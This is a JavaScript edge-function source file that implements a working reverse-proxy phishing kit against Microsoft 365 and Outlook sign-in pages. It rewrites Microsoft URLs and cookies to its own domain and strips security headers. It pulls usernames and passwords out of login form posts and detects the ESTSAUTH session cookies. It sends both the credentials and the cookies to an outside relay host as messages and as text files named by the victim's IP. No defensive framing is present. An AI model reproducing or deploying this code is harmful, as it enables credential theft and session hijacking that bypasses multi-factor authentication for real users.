export const runtime = 'edge';

// ==================== SIMPLE CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// Simple domain list - just like the working Cloudflare script
const PROXY_DOMAINS = [
  'login.microsoftonline.com',
  'login.live.com', 
  'account.live.com',
  'account.microsoft.com',
  'aadcdn.msauth.net',
  'www.office.com',
  'office.com',
  'microsoft365.com',
  'outlook.office.com',
  'outlook.live.com'
];

// ==================== SIMPLE HELPER FUNCTIONS ====================

async function sendToVercel(data, ip) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ data, ip, timestamp: new Date().toISOString() }),
    });
  } catch (e) {}
}

function parseCredentials(bodyText) {
  let user = null, pass = null;
  if (!bodyText) return { user, pass };
  
  try {
    const params = new URLSearchParams(bodyText);
    user = params.get('login') || params.get('loginfmt') || params.get('username');
    pass = params.get('passwd') || params.get('password');
    
    if (user && pass) {
      user = decodeURIComponent(user.replace(/\+/g, ' '));
      pass = decodeURIComponent(pass.replace(/\+/g, ' '));
    }
  } catch (e) {}
  
  return { user, pass };
}

// ==================== SIMPLE PROXY HANDLER ====================

export default async function handler(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0] || 'unknown';
  
  // Block specific IPs
  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }
  
  // === SIMPLE URL PARSING - NO QUERY PARAMETER MANIPULATION ===
  let targetHost = 'login.microsoftonline.com';
  let targetPath = url.pathname;
  
  // Check if this is a proxied request (starts with /_p/)
  if (url.pathname.startsWith('/_p/')) {
    const parts = url.pathname.substring(4).split('/'); // Remove '/_p/' and split
    if (parts.length >= 1) {
      targetHost = parts[0];
      targetPath = '/' + parts.slice(1).join('/');
    }
  }
  
  // Build target URL - PRESERVE ORIGINAL QUERY STRING WITHOUT MODIFICATION
  const targetUrl = `https://${targetHost}${targetPath}${url.search}`;
  
  console.log(`[PROXY] ${request.method} ${url.pathname} -> ${targetUrl}`);
  
  // === BUILD REQUEST HEADERS ===
  const headers = new Headers();
  
  // Copy all headers except problematic ones
  for (const [key, value] of request.headers) {
    const lowerKey = key.toLowerCase();
    if (!['host', 'connection', 'content-length', 'content-encoding', 
           'transfer-encoding', 'cf-ray', 'cf-connecting-ip'].includes(lowerKey)) {
      headers.set(key, value);
    }
  }
  
  // Set correct Host header
  headers.set('Host', targetHost);
  
  // Ensure Referer is set
  if (!headers.has('Referer')) {
    headers.set('Referer', `https://${targetHost}/`);
  }
  
  // === HANDLE REQUEST BODY ===
  let body = request.body;
  let credentialsCaptured = false;
  
  if (request.method === 'POST') {
    try {
      const cloned = request.clone();
      const bodyText = await cloned.text();
      const { user, pass } = parseCredentials(bodyText);
      
      if (user && pass) {
        console.log(`[CREDS] Captured: ${user.substring(0, 5)}...`);
        credentialsCaptured = true;
        await sendToVercel(`Credentials captured:\nUser: ${user}\nPass: ${pass}\nURL: ${url.href}`, ip);
        
        // Also send as file
        const formData = new FormData();
        formData.append('file', new Blob([`IP: ${ip}\nUser: ${user}\nPass: ${pass}\nURL: ${url.href}`], {type: 'text/plain'}), `${ip}-CREDENTIALS.txt`);
        await fetch(VERCEL_URL, { method: 'POST', body: formData });
      }
      
      body = bodyText;
    } catch (err) {
      body = request.body;
    }
  }
  
  try {
    // === FORWARD REQUEST TO UPSTREAM ===
    const response = await fetch(targetUrl, {
      method: request.method,
      headers: headers,
      body: body,
      redirect: 'manual'
    });
    
    // === HANDLE REDIRECTS ===
    if (response.status >= 300 && response.status < 400 && response.headers.has('Location')) {
      let location = response.headers.get('Location');
      
      // Rewrite location header to go through our proxy
      for (const domain of PROXY_DOMAINS) {
        if (location.includes(domain)) {
          location = location.replace(new RegExp(`https?://${domain.replace(/\./g, '\\.')}`), `https://${YOUR_DOMAIN}/_p/${domain}`);
          break;
        }
      }
      
      // Handle relative redirects
      if (location.startsWith('/')) {
        location = `https://${YOUR_DOMAIN}/_p/${targetHost}${location}`;
      }
      
      console.log(`[REDIRECT] ${response.status} -> ${location}`);
      
      const redirectHeaders = new Headers();
      redirectHeaders.set('Location', location);
      redirectHeaders.set('Access-Control-Allow-Origin', '*');
      redirectHeaders.set('Access-Control-Allow-Credentials', 'true');
      
      return new Response(null, {
        status: response.status,
        headers: redirectHeaders
      });
    }
    
    // === PROCESS RESPONSE ===
    const responseHeaders = new Headers();
    
    // Copy all response headers
    for (const [key, value] of response.headers) {
      const lowerKey = key.toLowerCase();
      
      // Handle Set-Cookie headers specially
      if (lowerKey === 'set-cookie') {
        let modifiedCookie = value;
        
        // Replace domain in cookie
        modifiedCookie = modifiedCookie.replace(
          new RegExp(targetHost.replace(/\./g, '\\.'), 'g'),
          YOUR_DOMAIN
        );
        
        // Also handle cookies with leading dot
        modifiedCookie = modifiedCookie.replace(
          new RegExp('\\.' + targetHost.replace(/\./g, '\\.'), 'g'),
          '.' + YOUR_DOMAIN
        );
        
        responseHeaders.append('Set-Cookie', modifiedCookie);
      } 
      // Skip security headers that might cause issues
      else if (!['content-security-policy', 'content-security-policy-report-only', 'clear-site-data'].includes(lowerKey)) {
        responseHeaders.set(key, value);
      }
    }
    
    // Add CORS headers
    responseHeaders.set('Access-Control-Allow-Origin', '*');
    responseHeaders.set('Access-Control-Allow-Credentials', 'true');
    responseHeaders.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    responseHeaders.set('Access-Control-Allow-Headers', 'Content-Type, Cookie, Set-Cookie');
    
    // === CHECK FOR AUTH COOKIES ===
    const setCookies = response.headers.getSetCookie();
    if (setCookies && setCookies.length) {
      const allCookies = setCookies.join('; ');
      const hasESTSAUTH = allCookies.toLowerCase().includes('estsauth=');
      const hasESTSAUTHPERSISTENT = allCookies.toLowerCase().includes('estsauthpersistent=');
      
      if (hasESTSAUTH && hasESTSAUTHPERSISTENT) {
        console.log(`[EXFIL] Complete session captured!`);
        await sendToVercel(`Cookies captured:\n${allCookies}\nURL: ${url.href}`, ip);
        
        const formData = new FormData();
        formData.append('file', new Blob([`IP: ${ip}\nURL: ${url.href}\n\n${allCookies}`], {type: 'text/plain'}), `${ip}-COOKIES.txt`);
        await fetch(VERCEL_URL, { method: 'POST', body: formData });
      }
    }
    
    // === PROCESS RESPONSE BODY ===
    const contentType = response.headers.get('content-type') || '';
    
    // For HTML/JS/CSS, replace domain references
    if (contentType.includes('text/html') || 
        contentType.includes('javascript') || 
        contentType.includes('json') || 
        contentType.includes('css')) {
      
      let text = await response.text();
      
      // Replace all proxy domains with our proxied URLs
      for (const domain of PROXY_DOMAINS) {
        const regex = new RegExp(`https?://${domain.replace(/\./g, '\\.')}`, 'g');
        text = text.replace(regex, `https://${YOUR_DOMAIN}/_p/${domain}`);
      }
      
      return new Response(text, {
        status: response.status,
        headers: responseHeaders
      });
    }
    
    // Return binary content as-is
    return new Response(response.body, {
      status: response.status,
      headers: responseHeaders
    });
    
  } catch (err) {
    console.error(`[ERROR] ${err.message}`);
    return new Response(
      JSON.stringify({ error: 'Proxy Error', message: err.message }),
      { status: 502, headers: { 'Content-Type': 'application/json' } }
    );
  }
}

// Export for all HTTP methods
export const GET = handler;
export const POST = handler;
export const PUT = handler;
export const DELETE = handler;
export const PATCH = handler;
export const OPTIONS = handler;
export const HEAD = handler;
